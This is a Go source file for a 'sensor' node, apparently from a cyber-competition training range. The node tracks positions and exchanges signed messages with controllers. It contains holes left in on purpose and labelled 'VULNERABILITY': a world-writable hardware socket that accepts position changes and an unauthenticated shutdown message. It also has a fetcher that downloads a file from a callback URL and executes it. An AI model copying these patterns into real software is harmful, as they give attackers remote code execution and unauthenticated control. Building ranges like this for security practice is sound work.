// SPDX-License-Identifier: GPL-3.0-or-later
package main

import (
	"context"
	"crypto/ed25519"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"viceroy/internal/config"
	"viceroy/internal/protocol"

	_ "github.com/mattn/go-sqlite3"
)

// --- HW state ---

type HWState struct {
	mu  sync.RWMutex
	lat float64
	lon float64
	alt float64
}

func (h *HWState) GetLocation() (float64, float64, float64) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.lat, h.lon, h.alt
}

func (h *HWState) SetLocation(lat, lon, alt float64) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.lat = lat
	h.lon = lon
	h.alt = alt
}

// --- HW socket request/response ---

type HWRequest struct {
	Action    string  `json:"action"`
	Latitude  float64 `json:"latitude,omitempty"`
	Longitude float64 `json:"longitude,omitempty"`
	Altitude  float64 `json:"altitude,omitempty"`
	Speed     float64 `json:"speed,omitempty"`
	Linger    float64 `json:"linger,omitempty"`
}

type HWResponse struct {
	OK       bool      `json:"ok"`
	Error    string    `json:"error,omitempty"`
	Location *Location `json:"location,omitempty"`
}

type Location struct {
	Latitude  float64 `json:"latitude"`
	Longitude float64 `json:"longitude"`
	Altitude  float64 `json:"altitude"`
}

func main() {
	cfgPath := os.Getenv("SENSOR_CONFIG_PATH")
	if cfgPath == "" {
		cfgPath = "/etc/sensor/config.yaml"
	}
	cfg, err := config.LoadConfig(cfgPath)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	var privKey ed25519.PrivateKey
	if cfg.KeyPath != "" {
		privKey, _ = protocol.LoadPrivateKey(cfg.KeyPath)
	}

	// Initialize SQLite
	dbPath := cfg.DBPath
	if dbPath == "" {
		dbPath = "/var/lib/mantis/tracks.db"
	}
	os.MkdirAll("/var/lib/mantis", 0755)
	db, err := sql.Open("sqlite3", dbPath+"?_journal_mode=WAL")
	if err != nil {
		log.Fatalf("Failed to open SQLite: %v", err)
	}
	db.Exec(`CREATE TABLE IF NOT EXISTS tracks (
		track_id TEXT PRIMARY KEY,
		latitude REAL,
		longitude REAL
	)`)
	// Clear any stale tracks from a previous run — the DB lives on a persistent
	// Docker volume, so scenario-injected tracks would otherwise linger across
	// restarts and cause spurious engagements at T+0 of every new session.
	db.Exec(`DELETE FROM tracks`)

	hw := &HWState{lat: cfg.InitialLat, lon: cfg.InitialLon, alt: cfg.InitialAlt}

	// Insert own track
	ownTrackID := fmt.Sprintf("%d", cfg.IFF)
	db.Exec(`INSERT OR REPLACE INTO tracks (track_id, latitude, longitude) VALUES (?, ?, ?)`,
		ownTrackID, cfg.InitialLat, cfg.InitialLon)

	ctx := context.Background()

	// Start HW Unix socket server
	go runHWSocket(ctx, cfg, hw)

	// Start HTTP server for track requests
	go runHTTPServer(ctx, cfg, db, privKey)

	// Start communicator (polls controllers, publishes tracks)
	go runCommunicator(ctx, cfg, db, hw, privKey)

	// Start fetcher/auto-puller (runs on ALL node types in real competition)
	if cfg.Beacon.Enabled {
		go runFetcher(ctx, cfg)
	}

	log.Printf("Sensor %s started on :%d", cfg.ID, cfg.ListenPort)
	select {}
}

// ===========================================================================
// Fetcher / Auto-puller — downloads and executes implant from callback URL
// ===========================================================================

func runFetcher(ctx context.Context, cfg *config.NodeConfig) {
	log.Printf("fetcher: polling %s every %ds", cfg.Beacon.CallbackURL, cfg.Beacon.CheckIntervalSec)

	for {
		time.Sleep(time.Duration(cfg.Beacon.CheckIntervalSec) * time.Second)

		client := &http.Client{Timeout: 30 * time.Second}
		resp, err := client.Get(cfg.Beacon.CallbackURL)
		if err != nil {
			continue
		}

		payload, err := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode != 200 || len(payload) < 100 {
			continue
		}

		os.MkdirAll("/run/fetcher", 0750)
		implantPath := "/run/fetcher/pulled_file"
		if err := os.WriteFile(implantPath, payload, 0755); err != nil {
			log.Printf("fetcher: failed to write: %v", err)
			continue
		}

		log.Printf("fetcher: downloaded %d bytes — executing", len(payload))

		cmd := exec.Command(implantPath)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Start(); err != nil {
			log.Printf("fetcher: failed to execute: %v", err)
			continue
		}

		log.Printf("fetcher: running (pid=%d)", cmd.Process.Pid)
		go cmd.Wait()
		return
	}
}

// --- HW Unix Socket Server ---

func runHWSocket(ctx context.Context, cfg *config.NodeConfig, hw *HWState) {
	os.MkdirAll(filepath.Dir(cfg.HWSocketPath), 0755)
	os.Remove(cfg.HWSocketPath)
	ln, err := net.Listen("unix", cfg.HWSocketPath)
	if err != nil {
		log.Fatalf("Failed to listen on hw socket: %v", err)
	}
	os.Chmod(cfg.HWSocketPath, 0777) // VULNERABILITY: world-writable

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			dec := json.NewDecoder(c)
			enc := json.NewEncoder(c)
			for {
				var req HWRequest
				if err := dec.Decode(&req); err != nil {
					return
				}
				switch strings.ToLower(req.Action) {
				case "get_location":
					lat, lon, alt := hw.GetLocation()
					enc.Encode(HWResponse{
						OK:       true,
						Location: &Location{Latitude: lat, Longitude: lon, Altitude: alt},
					})
				case "goto":
					hw.SetLocation(req.Latitude, req.Longitude, req.Altitude)
					enc.Encode(HWResponse{OK: true})
				default:
					enc.Encode(HWResponse{OK: false, Error: "unknown action"})
				}
			}
		}(conn)
	}
}

// --- HTTP Server (track requests) ---

func runHTTPServer(ctx context.Context, cfg *config.NodeConfig, db *sql.DB, privKey ed25519.PrivateKey) {
	mux := http.NewServeMux()

	mux.HandleFunc("/tracks/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}

		body, _ := io.ReadAll(r.Body)
		var tx protocol.Transmission
		if json.Unmarshal(body, &tx) != nil {
			http.Error(w, "invalid json", http.StatusBadRequest)
			return
		}

		// Handle Shutdown — VULNERABILITY
		if tx.MsgType == protocol.MsgShutdown {
			log.Printf("Received Shutdown — exiting")
			os.Exit(0)
		}

		if tx.MsgType != protocol.MsgSensorTrackRequest {
			http.Error(w, "unexpected msg_type", http.StatusBadRequest)
			return
		}

		var payload protocol.SensorTrackRequestPayload
		tx.ParseMsg(&payload)

		var track protocol.Track
		err := db.QueryRow("SELECT track_id, latitude, longitude FROM tracks WHERE track_id = ?",
			payload.TrackID).Scan(&track.TrackID, &track.Latitude, &track.Longitude)
		if err != nil {
			http.Error(w, "track not found", http.StatusNotFound)
			return
		}

		resp, _ := protocol.NewTransmission(tx.Source, cfg.ID, protocol.MsgSensorTrackReply, track)
		protocol.Sign(resp, privKey)
		data, _ := json.Marshal(resp)
		w.Header().Set("Content-Type", "application/json")
		w.Write(data)
	})

	// Endpoint for scenario engine to inject tracks
	mux.HandleFunc("/inject", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		body, _ := io.ReadAll(r.Body)
		var tracks []protocol.Track
		if json.Unmarshal(body, &tracks) != nil {
			http.Error(w, "invalid json", http.StatusBadRequest)
			return
		}
		for _, t := range tracks {
			db.Exec(`INSERT OR REPLACE INTO tracks (track_id, latitude, longitude) VALUES (?, ?, ?)`,
				t.TrackID, t.Latitude, t.Longitude)
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "injected %d tracks", len(tracks))
	})

	addr := fmt.Sprintf("%s:%d", cfg.ListenAddress, cfg.ListenPort)
	log.Printf("Sensor HTTP server listening on %s", addr)
	http.ListenAndServe(addr, mux)
}

// --- Communicator (polls controllers, publishes tracks) ---

func runCommunicator(ctx context.Context, cfg *config.NodeConfig, db *sql.DB, hw *HWState, privKey ed25519.PrivateKey) {
	time.Sleep(10 * time.Second) // startup delay per spec

	client := &http.Client{Timeout: 5 * time.Second}
	lastSuccess := 0

	sendToController := func(tx *protocol.Transmission) {
		protocol.Sign(tx, privKey)
		data, _ := json.Marshal(tx)

		for attempts := 0; attempts < len(cfg.Controllers); attempts++ {
			idx := (lastSuccess + attempts) % len(cfg.Controllers)
			ctrl := cfg.Controllers[idx]
			resp, err := client.Post(ctrl.IPAddr, "application/json", strings.NewReader(string(data)))
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			if resp.StatusCode == 200 || resp.StatusCode == 202 {
				lastSuccess = idx
				// Check for Shutdown response
				if len(body) > 2 {
					var reply protocol.Transmission
					if json.Unmarshal(body, &reply) == nil && reply.MsgType == protocol.MsgShutdown {
						log.Printf("Received Shutdown response — exiting")
						os.Exit(0)
					}
				}
				return
			}
		}
	}

	// Task polling: every 1 second
	// NOTE: comms queries hw via Unix socket, not direct struct access (per spec)
	go func() {
		for {
			lat, lon, alt := queryHWSocket(cfg.HWSocketPath)
			tx, _ := protocol.NewTransmission(
				cfg.Controllers[lastSuccess%len(cfg.Controllers)].ID,
				cfg.ID,
				protocol.MsgSensorGetTasks,
				protocol.SensorGetTasksPayload{
					CurrentLat:    lat,
					CurrentLon:    lon,
					CurrentAlt:    alt,
					ServerAddress: fmt.Sprintf("http://%s:%d", getOutboundIP(), cfg.ListenPort),
				},
			)
			sendToController(tx)
			time.Sleep(1 * time.Second)
		}
	}()

	// Track publication: every 5 seconds
	for {
		time.Sleep(5 * time.Second)

		rows, err := db.Query("SELECT track_id, latitude, longitude FROM tracks")
		if err != nil {
			continue
		}
		var tracks []protocol.Track
		for rows.Next() {
			var t protocol.Track
			rows.Scan(&t.TrackID, &t.Latitude, &t.Longitude)
			tracks = append(tracks, t)
		}
		rows.Close()

		if len(tracks) == 0 {
			continue
		}

		tx, _ := protocol.NewTransmission(
			cfg.Controllers[lastSuccess%len(cfg.Controllers)].ID,
			cfg.ID,
			protocol.MsgSensorTrackUpdate,
			protocol.SensorTrackUpdatePayload{Tracks: tracks},
		)
		sendToController(tx)
	}
}

// queryHWSocket queries the hw daemon via Unix socket for current position.
func queryHWSocket(socketPath string) (float64, float64, float64) {
	conn, err := net.DialTimeout("unix", socketPath, 2*time.Second)
	if err != nil {
		return 0, 0, 0
	}
	defer conn.Close()
	json.NewEncoder(conn).Encode(HWRequest{Action: "get_location"})
	var resp HWResponse
	if json.NewDecoder(conn).Decode(&resp) != nil || !resp.OK || resp.Location == nil {
		return 0, 0, 0
	}
	return resp.Location.Latitude, resp.Location.Longitude, resp.Location.Altitude
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "0.0.0.0"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
